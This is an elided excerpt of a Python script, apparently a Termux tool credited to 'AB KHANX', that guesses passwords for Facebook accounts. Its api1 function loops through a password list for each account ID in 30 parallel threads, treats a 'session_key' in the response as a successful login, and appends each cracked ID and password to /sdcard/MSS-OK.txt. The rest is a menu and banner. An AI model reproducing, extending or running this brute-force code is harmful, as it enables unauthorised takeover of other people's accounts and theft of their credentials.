...
print('\n\033[1;97m [•] checking update 10.4 \n wait a few sec...')
...
\033[1;32m___________________________________________
\033[1;34m
\033[1;32m    ███████╗██╗    ██╗ █████╗ ████████╗██╗
\033[1;32m    ██╔════╝██║    ██║██╔══██╗╚══██╔══╝██║
\033[1;32m    ███████╗██║ █╗ ██║███████║   ██║   ██║
...
\033[1;32m-------------------------------------------
 Owner      :  AB KHANX
 Github     :  https://github.com/MR-SW4TI
 Version    :  2.4
\033[1;32m-------------------------------------------""")                  
def linex():
        print('\033[1;32m-------------------------------------------')
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system(f'xdg-open https://www.facebook.com/SW4TI/{wx}');menu()
                        elif xd in ['7','07']:
                                os.system('xdg-openhttps://www.facebook.com/SW4TI/');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://www.youtube.com/@user-xg9yp9pr9j/');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use ')
                        else:
...
def pak():
                ...
                with tred(max_workers=30) as Sk:     
                        ...
                        print(f'\033[1;97m Choice code ..:\033[1;32m '+code)
...
def api1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32mMSS-OK '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MSS-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/MSS-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m MSS-OK '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/MSS-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32mMSS-OK '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/MSS-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
